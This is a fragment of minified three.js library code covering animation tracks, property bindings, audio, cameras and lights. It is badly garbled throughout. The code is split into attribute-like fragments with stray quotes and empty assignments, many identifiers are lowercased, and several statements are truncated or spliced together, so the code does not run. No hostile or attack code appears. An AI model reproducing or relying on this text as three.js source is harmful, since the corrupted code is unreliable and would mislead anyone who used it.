bindingsperobject(){return=\"\" e._bindings.length}}};=\"\" three.animationobjectgroup.prototype=\"{constructor:THREE.AnimationObjectGroup,add:function(a){for(var\" three.propertybinding(p,f[m],g[m]))}else=\"\" if(q<d){var=\"\" s=\"b[q],t=--d,r=b[t];e[r.uuid]=q;b[q]=r;e[m]=t;b[t]=p;m=0;for(r=k;m!==\" r;++m){var=\"\" u=\"h[m],v=u[q];u[q]=u[t];void\" three.propertybinding(p,f[m],g[m]));u[t]=\"v}}else\" b[q]!=\"=s&&console.error(\" different\"=\"\" objects=\"\" with=\"\" the=\"\" same=\"\" uuid=\"\" detected.=\"\" clean=\"\" caches=\"\" or=\"\" recreate=\"\" your=\"\" infrastructure=\"\" when=\"\" reloading=\"\" scenes...\")}this.ncachedobjects_=\"d},remove:function(a){for(var\">=c){var p=c++,m=b[p];d[m.uuid]=\nn;b[n]=m;d[l]=p;b[p]=k;k=0;for(l=f;k!==l;++k){var m=e[k],q=m[n];m[n]=m[p];m[p]=q}}}this.nCachedObjects_=c},uncache:function(a){for(var b=this._objects,c=b.length,d=this.nCachedObjects_,e=this._indicesByUUID,f=this._bindings,g=f.length,h=0,k=arguments.length;h!==k;++h){var l=arguments[h].uuid,n=e[l];if(void 0!==n)if(delete e[l],n<d){var 0=\"==f[d];)f=a[e++];if(void\" l=\"--d,p=b[l],m=--c,q=b[m];e[p.uuid]=n;b[n]=p;e[q.uuid]=l;b[l]=q;b.pop();p=0;for(q=g;p!==q;++p){var\" r=\"f[p],s=r[m];r[n]=r[l];r[l]=s;r.pop()}}else\" for(m=\"--c,q=b[m],e[q.uuid]=\" n,b[n]=\"q,b.pop(),p=0,q=g;p!==q;++p)r=f[p],r[n]=r[m],r.pop()}this.nCachedObjects_=d},subscribe_:function(a,b){var\" c=\"this._bindingsIndicesByPath,d=c[a],e=this._bindings;if(void\" 0!=\"=d)return\" e[d];var=\"\" f=\"this._paths,g=this._parsedPaths,h=this._objects,k=this.nCachedObjects_,l=Array(h.length),d=e.length;c[a]=d;f.push(a);g.push(b);e.push(l);c=k;for(d=h.length;c!==d;++c)l[c]=new\" three.propertybinding(h[c],a,b);return=\"\" l},unsubscribe_:function(a){var=\"\" b=\"this._bindingsIndicesByPath,c=b[a];if(void\" d=\"this._paths,e=this._parsedPaths,f=this._bindings,g=f.length-1,h=f[g];b[a[g]]=c;f[c]=h;f.pop();e[c]=e[g];e.pop();d[c]=d[g];d.pop()}}};\" three.animationutils=\"{arraySlice:function(a,b,c){return\" three.animationutils.istypedarray(a)?new=\"\" a.constructor(a.subarray(b,c)):a.slice(b,c)},convertarray:function(a,b,c){return!a||!c&&a.constructor=\"==b?a:\" number\"=\"==typeof\"\" b.bytes_per_element?new=\"\" b(a):array.prototype.slice.call(a)},istypedarray:function(a){return=\"\" arraybuffer.isview(a)&&!(a=\"\" instanceof=\"\" dataview)},getkeyframeorder:function(a){for(var=\"\" a[b]-a[c]});return=\"\" c},sortedarray:function(a,=\"\" b,c){for(var=\"\" a.constructor(d),f=\"0,g=0;g!==d;++f)for(var\" h=\"c[f]*b,k=0;k!==b;++k)e[g++]=a[h+k];return\" e},flattenjson:function(a,b,c,d){for(var=\"\" e=\"1,f=a[0];void\" g=\"f[d];if(void\" if(void=\"\" c.push(g)),f=\"a[e++];while(void\" error(\"track=\"\" name=\"\" is=\"\" undefined\");if(void=\"\" error(\"no=\"\" keyframes=\"\" in=\"\" track=\"\" named=\"\" \"+a);this.name=\"a;this.times=THREE.AnimationUtils.convertArray(b,this.TimeBufferType);this.values=THREE.AnimationUtils.convertArray(c,this.ValueBufferType);this.setInterpolation(d||this.DefaultInterpolation);this.validate();this.optimize()};\" three.keyframetrack.prototype=\"{constructor:THREE.KeyframeTrack,TimeBufferType:Float32Array,ValueBufferType:Float32Array,DefaultInterpolation:THREE.InterpolateLinear,InterpolantFactoryMethodDiscrete:function(a){return\" new=\"\" three.discreteinterpolant(this.times,this.values,this.getvaluesize(),a)},interpolantfactorymethodlinear:function(a){return=\"\" three.linearinterpolant(this.times,this.values,this.getvaluesize(),a)},interpolantfactorymethodsmooth:function(a){return=\"\" three.cubicinterpolant(this.times,=\"\" this.values,this.getvaluesize(),a)},setinterpolation:function(a){var=\"\" b;switch(a){case=\"\" three.interpolatediscrete:b=\"this.InterpolantFactoryMethodDiscrete;break;case\" three.interpolatelinear:b=\"this.InterpolantFactoryMethodLinear;break;case\" three.interpolatesmooth:b=\"this.InterpolantFactoryMethodSmooth}if(void\" interpolation=\"\" for=\"\" \"+this.valuetypename+\"=\"\" keyframe=\"\" \"+this.name;if(void=\"\" else=\"\" throw=\"\" error(b);console.warn(b)}else=\"\" this.createinterpolant=\"b},getInterpolation:function(){switch(this.createInterpolant){case\" this.interpolantfactorymethoddiscrete:return=\"\" three.interpolatediscrete;case=\"\" this.interpolantfactorymethodlinear:return=\"\" three.interpolatelinear;case=\"\" this.interpolantfactorymethodsmooth:return=\"\" three.interpolatesmooth}},getvaluesize:function(){return=\"\" this.values.length=\"\" this.times.length},shift:function(a){if(0!=\"=a)for(var\" this},=\"\" scale:function(a){if(1!=\"=a)for(var\" this},trim:function(a,b){for(var=\"\">b;)--f;++f;if(0!==e||f!==d)e>=f&&(f=Math.max(f,1),e=f-1),d=this.getValueSize(),this.times=THREE.AnimationUtils.arraySlice(c,e,f),this.values=THREE.AnimationUtils.arraySlice(this.values,e*d,f*d);return this},validate:function(){var a=!0,b=this.getValueSize();0!==b-Math.floor(b)&&(console.error(\"invalid value size in track\",\nthis),a=!1);var c=this.times,b=this.values,d=c.length;0===d&&(console.error(\"track is empty\",this),a=!1);for(var e=null,f=0;f!==d;f++){var g=c[f];if(\"number\"===typeof g&&isNaN(g)){console.error(\"time is not a valid number\",this,f,g);a=!1;break}if(null!==e&&e>g){console.error(\"out of order keys\",this,f,g,e);a=!1;break}e=g}if(void 0!==b&&THREE.AnimationUtils.isTypedArray(b))for(f=0,c=b.length;f!==c;++f)if(d=b[f],isNaN(d)){console.error(\"value is not a valid number\",this,f,d);a=!1;break}return a},optimize:function(){for(var a=\nthis.times,b=this.values,c=this.getValueSize(),d=1,e=1,f=a.length-1;e<=f;++e){var 0=\"==a.type)throw\" g=\"!1,h=a[e];if(h!==a[e+1]&&(1!==e||h!==h[0]))for(var\" k=\"e*c,l=k-c,n=k+c,h=0;h!==c;++h){var\" p=\"b[k+h];if(p!==b[l+h]||p!==b[n+h]){g=!0;break}}if(g){if(e!==d)for(a[d]=a[e],g=e*c,k=d*c,h=0;h!==c;++h)b[k+h]=b[g+h];++d}}d!==a.length&&(this.times=THREE.AnimationUtils.arraySlice(a,0,d),this.values=THREE.AnimationUtils.arraySlice(b,0,d*c));return\" this}};=\"\" object.assign(three.keyframetrack,{parse:function(a){if(void=\"\" error(\"track=\"\" type=\"\" undefined,=\"\" can=\"\" not=\"\" parse\");var=\"\" b=\"THREE.KeyframeTrack._getTrackTypeForValueTypeName(a.type);if(void\" c=\"[],d=[];THREE.AnimationUtils.flattenJSON(a.keys,c,d,\" value\");a.times=\"c;a.values=d}return\"\" void=\"\" 0!=\"=b.parse?b.parse(a):new\" b(a.name,a.times,a.values,a.interpolation)},tojson:function(a){var=\"\" array),values:three.animationutils.convertarray(a.values,array)},c=\"a.getInterpolation();c!==a.DefaultInterpolation&&(b.interpolation=c)}b.type=a.ValueTypeName;return\" b},_gettracktypeforvaluetypename:function(a){switch(a.tolowercase()){case=\"\" \"scalar\":case=\"\" \"double\":case=\"\" \"float\":case=\"\" \"number\":case=\"\" \"integer\":return=\"\" three.numberkeyframetrack;case=\"\" \"vector\":case=\"\" \"vector2\":case=\"\" \"vector3\":case=\"\" \"vector4\":return=\"\" three.vectorkeyframetrack;case=\"\" \"color\":return=\"\" three.colorkeyframetrack;case=\"\" \"quaternion\":return=\"\" three.quaternionkeyframetrack;=\"\" case=\"\" \"bool\":case=\"\" \"boolean\":return=\"\" three.booleankeyframetrack;case=\"\" \"string\":return=\"\" three.stringkeyframetrack}throw=\"\" error(\"unsupported=\"\" typename:=\"\" \"+a);}});three.propertybinding=\"function(a,b,c){this.path=b;this.parsedPath=c||THREE.PropertyBinding.parseTrackName(b);this.node=THREE.PropertyBinding.findNode(a,this.parsedPath.nodeName)||a;this.rootNode=a};\" three.propertybinding.prototype=\"{constructor:THREE.PropertyBinding,getValue:function(a,b){this.bind();this.getValue(a,b)},setValue:function(a,b){this.bind();this.setValue(a,b)},bind:function(){var\" a=\"this.node,b=this.parsedPath,c=b.objectName,d=b.propertyName,e=b.propertyIndex;a||(this.node=a=THREE.PropertyBinding.findNode(this.rootNode,b.nodeName)||this.rootNode);this.getValue=this._getValue_unavailable;this.setValue=this._setValue_unavailable;if(a){if(c){var\" f=\"b.objectIndex;switch(c){case\" \"materials\":if(!a.material){console.error(\"=\"\" bind=\"\" to=\"\" material=\"\" as=\"\" node=\"\" does=\"\" have=\"\" material\",=\"\" this);return}if(!a.material.materials){console.error(\"=\"\" material.materials=\"\" node.material=\"\" materials=\"\" array\",this);return}a=\"a.material.materials;break;case\" \"bones\":if(!a.skeleton){console.error(\"=\"\" bones=\"\" skeleton\",this);return}a=\"a.skeleton.bones;for(c=0;c<a.length;c++)if(a[c].name===f){f=c;break}break;default:if(void\" objectname=\"\" of=\"\" node,=\"\" undefined\",this);return}a=\"a[c]}if(void\" a[f]){console.error(\"=\"\" trying=\"\" objectindex=\"\" objectname,=\"\" but=\"\" is=\"\" undefined:\",this,a);return}a=\"a[f]}}f=a[d];if(void\" update=\"\" property=\"\" for=\"\" track:=\"\" \"+b.nodename+\".\"+d+\"=\"\" it=\"\" wasn't=\"\" found.\",a);else{b=\"this.Versioning.None;void\" d){if(!a.geometry){console.error(\"=\"\" morphtargetinfluences=\"\" becasuse=\"\" geometry\",this);return}if(!a.geometry.morphtargets){console.error(\"=\"\" geometry.morphtargets\",this);return}for(c=\"0;c<this.node.geometry.morphTargets.length;c++)if(a.geometry.morphTargets[c].name===e){e=c;break}}c=this.BindingType.ArrayElement;this.resolvedProperty=f;this.propertyIndex=e}else\" (c=\"this.BindingType.HasFromToArray,this.resolvedProperty=f):void\" console.error(\"=\"\" \"+this.path+\"=\"\" found.\")},unbind:function(){this.node=\"null;this.getValue=this._getValue_unbound;this.setValue=this._setValue_unbound}};\" object.assign(three.propertybinding.prototype,{_getvalue_unavailable:function(){},_setvalue_unavailable:function(){},_getvalue_unbound:three.propertybinding.prototype.getvalue,_setvalue_unbound:three.propertybinding.prototype.setvalue,bindingtype:{direct:0,entirearray:1,arrayelement:2,hasfromtoarray:3},versioning:{none:0,needsupdate:1,matrixworldneedsupdate:2},getterbybindingtype:[function(a,b){a[b]=\"this.node[this.propertyName]},function(a,b){for(var\" c[d]},function(a,b){a[b]=\"this.resolvedProperty[this.propertyIndex]},function(a,b){this.resolvedProperty.toArray(a,b)}],SetterByBindingTypeAndVersioning:[[function(a,b){this.node[this.propertyName]=a[b]},function(a,b){this.node[this.propertyName]=a[b];this.targetObject.needsUpdate=!0},function(a,b){this.node[this.propertyName]=a[b];this.targetObject.matrixWorldNeedsUpdate=!0}],[function(a,b){for(var\" d=\"0,e=c.length;d!==e;++d)c[d]=a[b++];this.targetObject.needsUpdate=!0},function(a,b){for(var\" b)},function(a,b){this.resolvedproperty.fromarray(a,b);this.targetobject.needsupdate=\"!0},function(a,b){this.resolvedProperty.fromArray(a,b);this.targetObject.matrixWorldNeedsUpdate=!0}]]});THREE.PropertyBinding.Composite=function(a,b,c){c=c||THREE.PropertyBinding.parseTrackName(b);this._targetGroup=a;this._bindings=a.subscribe_(b,c)};\" three.propertybinding.composite.prototype=\"{constructor:THREE.PropertyBinding.Composite,getValue:function(a,b){this.bind();var\" instanceof=\"\" three.animationobjectgroup?new=\"\" three.propertybinding.composite(a,b,c):new=\"\" three.propertybinding(a,b,c)};=\"\" three.propertybinding.parsetrackname=\"function(a){var\" ]+)\\])?)?(\\.([\\w.]+)(\\[([\\w\\d\\[\\]\\_.=\"\" ]+)\\])?)$=\"\" ,c=\"b.exec(a);if(!c)throw\" error(\"cannot=\"\" parse=\"\" trackname=\"\" at=\"\" all:=\"\" \"+a);c.index=\"==b.lastIndex&&b.lastIndex++;b={nodeName:c[3],objectName:c[5],objectIndex:c[7],propertyName:c[9],propertyIndex:c[11]};if(null===b.propertyName||0===b.propertyName.length)throw\" error(\"can=\"\" propertyname=\"\" from=\"\" trackname:=\"\" \"+a);return=\"\" b};=\"\" three.propertybinding.findnode=\"function(a,b){if(!b||\" \"=\"==b||\"root\"===b||\".\"===b||-1===b||b===a.name||b===a.uuid)return\"\" a;if(a.skeleton){var=\"\" d}return=\"\" null}(a.skeleton);if(c)return=\"\" c}if(a.children){var=\"\" g}return=\"\" null};if(c=\"d(a.children))return\" c}return=\"\" null};=\"\" three.propertymixer=\"function(a,b,c){this.binding=a;this.valueSize=c;a=Float64Array;switch(b){case\" \"quaternion\":b=\"this._slerp;break;case\" \"string\":case=\"\" \"bool\":a=\"Array;b=this._select;break;default:b=this._lerp}this.buffer=new\" a(4*c);this._mixbufferregion=\"b;this.referenceCount=this.useCount=this.cumulativeWeight=0};\" three.propertymixer.prototype=\"{constructor:THREE.PropertyMixer,accumulate:function(a,b){var\" f+=\"b,this._mixBufferRegion(c,e,0,b/f,d);this.cumulativeWeight=f},apply:function(a){var\">d&&this._mixBufferRegion(c,a,3*b,1-d,b);for(var d=b,f=b+b;d!==f;++d)if(c[d]!==c[d+b]){e.setValue(c,a);\nbreak}},saveOriginalState:function(){var a=this.buffer,b=this.valueSize,c=3*b;this.binding.getValue(a,c);for(var d=b;d!==c;++d)a[d]=a[c+d%b];this.cumulativeWeight=0},restoreOriginalState:function(){this.binding.setValue(this.buffer,3*this.valueSize)},_select:function(a,b,c,d,e){if(.5<=d)for(d=0;d!==e;++d)a[b+d]=a[c+d]},_slerp:function(a,b,c,d,e){three.quaternion.slerpflat(a,b,a,b,a,c,d)},_lerp:function(a,b,c,d,e){for(var 0=\"==a&&(a=new\" f=\"1-d,g=0;g!==e;++g){var\" h=\"b+g;a[h]=a[h]*f+a[c+g]*d}}};\" three.booleankeyframetrack=\"function(a,b,c){THREE.KeyframeTrack.call(this,a,b,c)};THREE.BooleanKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.BooleanKeyframeTrack,ValueTypeName:\" bool\",valuebuffertype:array,defaultinterpolation:three.interpolatediscrete,interpolantfactorymethodlinear:void\"=\"\" 0,interpolantfactorymethodsmooth:void=\"\" 0});three.colorkeyframetrack=\"function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\" three.colorkeyframetrack.prototype=\"Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.ColorKeyframeTrack,ValueTypeName:\" color\"});three.numberkeyframetrack=\"function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};THREE.NumberKeyframeTrack.prototype=Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.NumberKeyframeTrack,ValueTypeName:\"number\"});THREE.QuaternionKeyframeTrack=function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\"\" three.quaternionkeyframetrack.prototype=\"Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.QuaternionKeyframeTrack,ValueTypeName:\" quaternion\",defaultinterpolation:three.interpolatelinear,interpolantfactorymethodlinear:function(a){return\"=\"\" new=\"\" three.quaternionlinearinterpolant(this.times,this.values,this.getvaluesize(),a)},interpolantfactorymethodsmooth:void=\"\" 0});three.stringkeyframetrack=\"function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\" three.stringkeyframetrack.prototype=\"Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.StringKeyframeTrack,ValueTypeName:\" string\",valuebuffertype:array,defaultinterpolation:three.interpolatediscrete,interpolantfactorymethodlinear:void\"=\"\" 0});three.vectorkeyframetrack=\"function(a,b,c,d){THREE.KeyframeTrack.call(this,a,b,c,d)};\" three.vectorkeyframetrack.prototype=\"Object.assign(Object.create(THREE.KeyframeTrack.prototype),{constructor:THREE.VectorKeyframeTrack,ValueTypeName:\" vector\"});\"=\"\" three.audio=\"function(a){THREE.Object3D.call(this);this.type=\" audio\";this.context=\"a.context;this.source=this.context.createBufferSource();this.source.onended=this.onEnded.bind(this);this.gain=this.context.createGain();this.gain.connect(a.getInput());this.autoplay=!1;this.startTime=0;this.playbackRate=1;this.isPlaying=!1;this.hasPlaybackControl=!0;this.sourceType=\"empty\";this.filters=[]};\"\" three.audio.prototype=\"Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Audio,getOutput:function(){return\" this.gain},setnodesource:function(a){this.hasplaybackcontrol=\"!1;this.sourceType=\" audionode\";this.source=\"a;this.connect();return\"\" this},setbuffer:function(a){this.source.buffer=\"a;this.sourceType=\" buffer\";this.autoplay&&this.play();return\"=\"\" this},play:function(){if(!0=\"==this.isPlaying)console.warn(\" three.audio:\"=\"\" audio=\"\" is=\"\" already=\"\" playing.\");else=\"\" if(!1=\"==this.hasPlaybackControl)console.warn(\" this=\"\" has=\"\" no=\"\" playback=\"\" control.\");=\"\" else{var=\"\" a=\"this.context.createBufferSource();a.buffer=this.source.buffer;a.loop=this.source.loop;a.onended=this.source.onended;a.start(0,this.startTime);a.playbackRate.value=this.playbackRate;this.isPlaying=!0;this.source=a;return\" this.connect()}},pause:function(){if(!1=\"==this.hasPlaybackControl)console.warn(\" control.\");else=\"\" return=\"\" this.source.stop(),this.starttime=\"this.context.currentTime,this.isPlaying=!1,this},stop:function(){if(!1===this.hasPlaybackControl)console.warn(\" else=\"\" this.source.connect(this.getoutput());return=\"\" this},disconnect:function(){if(0<this.filters.length){this.source.disconnect(this.filters[0]);for(var=\"\" 1].disconnect(this.filters[a]);this.filters[this.filters.length-1].disconnect(this.getoutput())}else=\"\" this.source.disconnect(this.getoutput());return=\"\" this},getfilters:function(){return=\"\" this.filters},setfilters:function(a){a||(a=\"[]);!0===this.isPlaying?(this.disconnect(),this.filters=a,this.connect()):this.filters=a;return\" this},getfilter:function(){return=\"\" this.getfilters()[0]},setfilter:function(a){return=\"\" this.setfilters(a?[a]:[])},setplaybackrate:function(a){if(!1=\"==this.hasPlaybackControl)console.warn(\" this.playbackrate=\"a,!0===this.isPlaying&&(this.source.playbackRate.value=this.playbackRate),this},getPlaybackRate:function(){return\" this.playbackrate},onended:function(){this.isplaying=\"!1},getLoop:function(){return!1===this.hasPlaybackControl?(console.warn(\" control.\"),!1):this.source.loop},setloop:function(a){!1=\"==this.hasPlaybackControl?console.warn(\" control.\"):this.source.loop=\"a},getVolume:function(){return\" this.gain.gain.value},=\"\" setvolume:function(a){this.gain.gain.value=\"a;return\" this}});three.audioanalyser=\"function(a,b){this.analyser=a.context.createAnalyser();this.analyser.fftSize=void\" 0!=\"=b?b:2048;this.data=new\" uint8array(this.analyser.frequencybincount);a.getoutput().connect(this.analyser)};=\"\" object.assign(three.audioanalyser.prototype,{getfrequencydata:function(){this.analyser.getbytefrequencydata(this.data);return=\"\" this.data},getaveragefrequency:function(){for(var=\"\" b.length}});object.defineproperty(three,\"audiocontext\",{get:function(){var=\"\" a;return=\"\" function(){void=\"\" (window.audiocontext||window.webkitaudiocontext));return=\"\" a}}()});=\"\" three.positionalaudio=\"function(a){THREE.Audio.call(this,a);this.panner=this.context.createPanner();this.panner.connect(this.gain)};\" three.positionalaudio.prototype=\"Object.assign(Object.create(THREE.Audio.prototype),{constructor:THREE.PositionalAudio,getOutput:function(){return\" this.panner},getrefdistance:function(){return=\"\" this.panner.refdistance},setrefdistance:function(a){this.panner.refdistance=\"a},getRolloffFactor:function(){return\" this.panner.rollofffactor},setrollofffactor:function(a){this.panner.rollofffactor=\"a},getDistanceModel:function(){return\" this.panner.distancemodel},setdistancemodel:function(a){this.panner.distancemodel=\"a},getMaxDistance:function(){return\" this.panner.maxdistance},setmaxdistance:function(a){this.panner.maxdistance=\"a},updateMatrixWorld:function(){var\" three.vector3;return=\"\" function(b){three.object3d.prototype.updatematrixworld.call(this,b);a.setfrommatrixposition(this.matrixworld);this.panner.setposition(a.x,a.y,a.z)}}()});=\"\" three.audiolistener=\"function(){THREE.Object3D.call(this);this.type=\" audiolistener\";this.context=\"THREE.AudioContext;this.gain=this.context.createGain();this.gain.connect(this.context.destination);this.filter=null};\"\" three.audiolistener.prototype=\"Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.AudioListener,getInput:function(){return\" this.gain},removefilter:function(){null!=\"=this.filter&&(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination),this.gain.connect(this.context.destination),this.filter=null)},getFilter:function(){return\" this.filter},setfilter:function(a){null!=\"=this.filter?(this.gain.disconnect(this.filter),this.filter.disconnect(this.context.destination)):\" this.gain.disconnect(this.context.destination);this.filter=\"a;this.gain.connect(this.filter);this.filter.connect(this.context.destination)},getMasterVolume:function(){return\" this.gain.gain.value},setmastervolume:function(a){this.gain.gain.value=\"a},updateMatrixWorld:function(){var\" three.vector3,b=\"new\" three.quaternion,c=\"new\" three.vector3,d=\"new\" function(e){three.object3d.prototype.updatematrixworld.call(this,e);e=\"this.context.listener;var\" b,c);d.set(0,0,-1).applyquaternion(b);e.setposition(a.x,a.y,a.z);e.setorientation(d.x,d.y,d.z,f.x,f.y,f.z)}}()});three.camera=\"function(){THREE.Object3D.call(this);this.type=\" camera\";this.matrixworldinverse=\"new\"\" three.matrix4;this.projectionmatrix=\"new\" three.matrix4};three.camera.prototype=\"Object.create(THREE.Object3D.prototype);THREE.Camera.prototype.constructor=THREE.Camera;\" three.camera.prototype.getworlddirection=\"function(){var\" three.quaternion;return=\"\" function(b){b=\"b||new\" three.vector3;this.getworldquaternion(a);return=\"\" b.set(0,0,-1).applyquaternion(a)}}();three.camera.prototype.lookat=\"function(){var\" three.matrix4;return=\"\" function(b){a.lookat(this.position,b,this.up);this.quaternion.setfromrotationmatrix(a)}}();three.camera.prototype.clone=\"function(){return(new\" this.constructor).copy(this)};=\"\" three.camera.prototype.copy=\"function(a){THREE.Object3D.prototype.copy.call(this,a);this.matrixWorldInverse.copy(a.matrixWorldInverse);this.projectionMatrix.copy(a.projectionMatrix);return\" this};=\"\" three.cubecamera=\"function(a,b,c){THREE.Object3D.call(this);this.type=\" cubecamera\";var\"=\"\" d=\"new\" three.perspectivecamera(90,1,a,b);d.up.set(0,-1,0);d.lookat(new=\"\" three.vector3(1,0,0));this.add(d);var=\"\" e=\"new\" three.perspectivecamera(90,1,a,b);e.up.set(0,-1,0);e.lookat(new=\"\" three.vector3(-1,0,0));this.add(e);var=\"\" three.perspectivecamera(90,1,a,b);f.up.set(0,0,1);f.lookat(new=\"\" three.vector3(0,1,0));this.add(f);var=\"\" g=\"new\" three.perspectivecamera(90,1,a,b);g.up.set(0,0,-1);g.lookat(new=\"\" three.vector3(0,-1,0));=\"\" this.add(g);var=\"\" three.perspectivecamera(90,1,a,b);h.up.set(0,-1,0);h.lookat(new=\"\" three.vector3(0,0,1));this.add(h);var=\"\" k=\"new\" three.perspectivecamera(90,1,a,b);k.up.set(0,-1,0);k.lookat(new=\"\" three.vector3(0,0,-1));this.add(k);this.rendertarget=\"new\" three.webglrendertargetcube(c,c,{format:three.rgbformat,magfilter:three.linearfilter,minfilter:three.linearfilter});this.updatecubemap=\"function(a,b){null===this.parent&&this.updateMatrixWorld();var\" c=\"this.renderTarget,m=c.texture.generateMipmaps;c.texture.generateMipmaps=\" !1;c.activecubeface=\"0;a.render(b,d,c);c.activeCubeFace=1;a.render(b,e,c);c.activeCubeFace=2;a.render(b,f,c);c.activeCubeFace=3;a.render(b,g,c);c.activeCubeFace=4;a.render(b,h,c);c.texture.generateMipmaps=m;c.activeCubeFace=5;a.render(b,k,c);a.setRenderTarget(null)}};THREE.CubeCamera.prototype=Object.create(THREE.Object3D.prototype);THREE.CubeCamera.prototype.constructor=THREE.CubeCamera;\" three.orthographiccamera=\"function(a,b,c,d,e,f){THREE.Camera.call(this);this.type=\" orthographiccamera\";this.zoom=\"1;this.view=null;this.left=a;this.right=b;this.top=c;this.bottom=d;this.near=void\"\" three.orthographiccamera.prototype=\"Object.assign(Object.create(THREE.Camera.prototype),{constructor:THREE.OrthographicCamera,copy:function(a){THREE.Camera.prototype.copy.call(this,a);this.left=a.left;this.right=a.right;this.top=a.top;this.bottom=a.bottom;this.near=a.near;this.far=a.far;this.zoom=a.zoom;this.view=null===a.view?null:Object.assign({},a.view);return\" this},setviewoffset:function(a,b,c,d,e,f){this.view=\"{fullWidth:a,fullHeight:b,offsetX:c,offsetY:d,width:e,height:f};this.updateProjectionMatrix()},\" clearviewoffset:function(){this.view=\"null;this.updateProjectionMatrix()},updateProjectionMatrix:function(){var\" a}});=\"\" three.perspectivecamera=\"function(a,b,c,d){THREE.Camera.call(this);this.type=\" perspectivecamera\";this.fov=\"void\"\" three.perspectivecamera.prototype=\"Object.assign(Object.create(THREE.Camera.prototype),{constructor:THREE.PerspectiveCamera,copy:function(a){THREE.Camera.prototype.copy.call(this,a);this.fov=a.fov;this.zoom=a.zoom;this.near=a.near;this.far=a.far;this.focus=a.focus;this.aspect=a.aspect;this.view=null===a.view?null:Object.assign({},a.view);this.filmGauge=a.filmGauge;this.filmOffset=a.filmOffset;return\" this},setfocallength:function(a){a=\".5*this.getFilmHeight()/a;this.fov=2*THREE.Math.RAD2DEG*Math.atan(a);\" this.updateprojectionmatrix()},getfocallength:function(){var=\"\" 2*three.math.rad2deg*math.atan(math.tan(.5*three.math.deg2rad*this.fov)=\"\" this.zoom)},getfilmwidth:function(){return=\"\" this.filmgauge*math.min(this.aspect,1)},getfilmheight:function(){return=\"\" this.filmgauge=\"\" math.max(this.aspect,1)},setviewoffset:function(a,b,c,d,e,f){this.aspect=\"a/b;this.view={fullWidth:a,fullHeight:b,offsetX:c,offsetY:d,\" width:e,height:f};this.updateprojectionmatrix()},clearviewoffset:function(){this.view=\"null;this.updateProjectionMatrix()},updateProjectionMatrix:function(){var\" three.object3d.prototype.tojson.call(this,a);a.object.fov=\"this.fov;a.object.zoom=this.zoom;a.object.near=this.near;a.object.far=this.far;a.object.focus=this.focus;a.object.aspect=this.aspect;null!==this.view&&(a.object.view=Object.assign({},this.view));a.object.filmGauge=this.filmGauge;a.object.filmOffset=this.filmOffset;return\" three.stereocamera=\"function(){this.type=\" stereocamera\";this.aspect=\"1;this.cameraL=new\"\" three.perspectivecamera;this.cameral.layers.enable(1);this.cameral.matrixautoupdate=\"!1;this.cameraR=new\" three.perspectivecamera;this.camerar.layers.enable(2);this.camerar.matrixautoupdate=\"!1};\" object.assign(three.stereocamera.prototype,{update:function(){var=\"\" a,b,c,d,e,f=\"new\" three.matrix4,g=\"new\" function(h){if(a!=\"=h.focus||b!==h.fov||c!==h.aspect*this.aspect||d!==h.near||e!==h.far){a=h.focus;b=h.fov;c=h.aspect*this.aspect;d=h.near;e=h.far;var\" p=\"-n*c-l;m=n*c-l;k.elements[0]=2*d/(m-p);k.elements[8]=(m+p)/(m-p);this.cameraR.projectionMatrix.copy(k)}this.cameraL.matrixWorld.copy(h.matrixWorld).multiply(g);this.cameraR.matrixWorld.copy(h.matrixWorld).multiply(f)}}()});THREE.Light=function(a,b){THREE.Object3D.call(this);this.type=\" light\";this.color=\"new\"\" three.color(a);this.intensity=\"void\" 0};=\"\" three.light.prototype=\"Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Light,copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.color.copy(a.color);this.intensity=a.intensity;return\" this},tojson:function(a){a=\"THREE.Object3D.prototype.toJSON.call(this,a);a.object.color=this.color.getHex();a.object.intensity=this.intensity;void\" this.angle&&(a.object.angle=\"this.angle);void\" a}});three.lightshadow=\"function(a){this.camera=a;this.bias=0;this.radius=1;this.mapSize=new\" three.vector2(512,512);this.map=\"null;this.matrix=new\" three.matrix4};object.assign(three.lightshadow.prototype,{copy:function(a){this.camera=\"a.camera.clone();this.bias=a.bias;this.radius=a.radius;this.mapSize.copy(a.mapSize);return\" this},clone:function(){return(new=\"\" this.constructor).copy(this)}});=\"\" three.ambientlight=\"function(a,b){THREE.Light.call(this,a,b);this.type=\" ambientlight\";this.castshadow=\"void\"\" 0};three.ambientlight.prototype=\"Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.AmbientLight});THREE.DirectionalLight=function(a,b){THREE.Light.call(this,a,b);this.type=\" directionallight\";this.position.set(0,1,0);this.updatematrix();this.target=\"new\"\" three.object3d;this.shadow=\"new\" three.directionallightshadow};=\"\" three.directionallight.prototype=\"Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.DirectionalLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.target=a.target.clone();this.shadow=a.shadow.clone();return\" this}});three.directionallightshadow=\"function(a){THREE.LightShadow.call(this,new\" three.orthographiccamera(-5,5,5,-5,.5,500))};three.directionallightshadow.prototype=\"Object.assign(Object.create(THREE.LightShadow.prototype),{constructor:THREE.DirectionalLightShadow});\" three.hemispherelight=\"function(a,b,c){THREE.Light.call(this,a,c);this.type=\" hemispherelight\";this.castshadow=\"void\"\" 0;this.position.set(0,1,0);this.updatematrix();this.groundcolor=\"new\" three.color(b)};three.hemispherelight.prototype=\"Object.assign(Object.create(THREE.Light.prototype),{constructor:THREE.HemisphereLight,copy:function(a){THREE.Light.prototype.copy.call(this,a);this.groundColor.copy(a.groundColor);return\" this}});=\"\" three.pointlight=\"function(a,b,c,d){THREE.Light.call(this,a,b);this.type=\" pointlight\";object.defineproperty(this,\"power\",{get:function(){return\"=\"\" 